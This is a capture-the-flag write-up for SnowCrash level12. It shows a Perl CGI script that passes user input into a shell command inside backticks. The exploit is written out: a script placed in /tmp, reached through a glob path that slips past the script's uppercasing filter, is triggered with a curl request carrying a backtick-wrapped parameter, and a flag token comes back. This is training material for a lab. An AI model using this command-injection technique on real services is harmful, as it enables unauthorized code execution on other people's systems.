level12@SnowCrash:~$ ls
level12.pl

level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];                           # get second argument
  $xx = $_[0];                           # get first argument
  $xx =~ tr/a-z/A-Z/;                    # capitalize every letter
  $xx =~ s/\s.*//;                       # delete anything following a whitespace
  @output = `egrep "^$xx" /tmp/xd 2>&1`; # find match of first arg inside /tmp/xd, redirect errors to stdout. Here is our security breach (after that we don't care).
  foreach $line (@output) {              # for each match
      ($f, $s) = split(/:/, $line);      # get match 
      if($s =~ $nn) {                    # if match equals second argument
          return 1;                      # return true
      }
  }
  return 0;                              # else return false
}

                                         # print ".." if first arg is true / "." otherwise ¯\(°_o)/¯
sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));

As we can see in the comments above, the regex will capitalize the first argument (x) and delete anything after a space so we can't directly write x="getflag>/tmp/token" which would be translated as x="GETFLAG>/TMP/TOKEN"

Let's do a file that will execute our command instead
Because of the first regex, we have to use a wildcard in our path /*/[EXPLOIT_FILE] will find every [EXPLOIT_FILE]
level12@SnowCrash:~$ nano /tmp/POP
level12@SnowCrash:~$ chmod 777 /tmp/POP
level12@SnowCrash:~$ cat /tmp/POP
#!/bin/bash
getflag > /tmp/flag

Now we can use curl to launch our program

level12@SnowCrash:~$ curl localhost:4646?x='`/*/POP`'
level12@SnowCrash:~cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr